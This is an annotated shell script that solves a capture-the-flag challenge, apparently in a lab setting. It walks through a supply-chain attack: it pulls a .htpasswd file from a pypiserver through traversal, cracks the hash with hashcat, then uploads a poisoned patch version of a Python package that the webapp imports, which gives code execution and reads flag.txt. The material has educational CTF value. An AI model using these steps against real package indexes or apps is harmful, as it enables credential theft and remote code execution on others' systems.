#!/bin/sh

# Play with the webapp, see how it works, and download library sources from /about/ page and inspect.
# See that calculator_wrapper is rebuild every 60 seconds and that it imports concrete_calculator.
# See that the package is built using Poetry-1.5.1, using Semantic Versioning for the concrete_calcualtor version.
# Deduce that if we could upload a malicious patch version of concrete_calculator, it would be pulled and
#   imported into calculator_wrapper and run in our web app on rebuild.

# Look at the self hosted pypiserver and take note of the version, the custom /health/ endpoint, and required auth.
# Read pypiserver README on github, see that it's possibly run with .htpasswd for auth.
# Run directory fuzzer on custom /health/ endpoint to see it included a .htpasswd file.

# Use directory traversal/LFI bug to get pypiserver username and SHA-1(Base64) hashed password.
curl -k https://clownconcrete.plasticuproject.com:42425/health/.htpasswd --output creds.txt

# Crack the SHA-1(Base64) hashed password with rockyou.txt dictionary attack with.
#   `./hashcat.bin -a 0 -m 101 "{SHA}FyQc7t5bmOBhQ9mGsYPSrSaVeM4=" rockyou.txt`

# Log into the pypisever and see it's hosting concrete_calcualtor package.
# Deduce that you can modify this package to perform an RCE on the webapp.

# Add user:pass to pypirc.
# Copy FakePyPi config file.
cp pypirc ~/.pypirc

# Download and inflate library source files.
curl -k https://clownconcrete.plasticuproject.com/about/concrete_calculator_source --output concrete_calculator-1.9.9.9.9.9.9.9.9.9.tar.gz
tar zxvf concrete_calculator-1.9.9.9.9.9.9.9.9.9.tar.gz
rm concrete_calculator-1.9.9.9.9.9.9.9.9.9.tar.gz

# Once you've found you can successfully RCE the application, you will notice that outbound networking has been
#   disabled, so reverse shelling or exfiltrating data over the internet is not possile. The workaround for this
#   is to execute code that returns data via the webapp itself, the most obvious place  being the modal that
#   returns our calculation result. We see in calculator_wrapper that this data is forced to be of type int or float,
#   so we need to encode whatever we are returning as some kind of integer value, then decode it back to a string
#   once it's return to us. So in a concrete_calculator method, we will attempt to read the file 'flag.txt',
#   as that's CTF convention.

# Modify the library code to read flag.txt, encode it as an integer and return it from one of the methods
#   that calculated a concrete volume.
# Patch pyproject and library files with patch version and exploit code, respectively.
patch -ruN concrete_calculator-1.9.9.9.9.9.9.9.9.9/pyproject.toml -i pyproject.toml.patch
patch -ruN concrete_calculator-1.9.9.9.9.9.9.9.9.9/concrete_calculator/__init__.py -i __init__.py.patch

# Build patched library wheel, upload to FakePypi server, and wait for rebuild.
cd concrete_calculator-1.9.9.9.9.9.9.9.9.9/
python -m build --wheel
python ../twine_trusted_monkey_patch.py upload dist/* -r fakepypi
cd ../
echo "\nWaiting 90 seconds for payload to be applied...\n"
sleep 90

# Trigger payload, retrieve flag, decode, and print to screen.
python decode.py
